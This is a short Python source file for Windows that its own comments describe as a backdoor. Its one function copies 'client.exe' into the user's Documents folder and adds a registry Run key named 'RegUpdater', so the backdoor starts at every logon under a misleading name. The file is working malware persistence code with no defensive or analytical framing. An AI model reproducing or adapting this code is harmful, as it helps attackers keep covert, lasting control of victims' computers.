import os
import shutil
import _winreg as wreg
import subprocess


def Persistence():
    path = os.getcwd().strip(
        '/n')  # Get current working directory where the backdoor gets executed, we use the output to build our source path
    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
    destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
    if not os.path.exists(destination):
        # Copy our Backdoor to C:\Users\<UserName>\Documents\
        shutil.copyfile(path + '\client.exe', destination)  # copy file to Document folder
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                           wreg.KEY_ALL_ACCESS)  # add regitry
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
        key.Close()
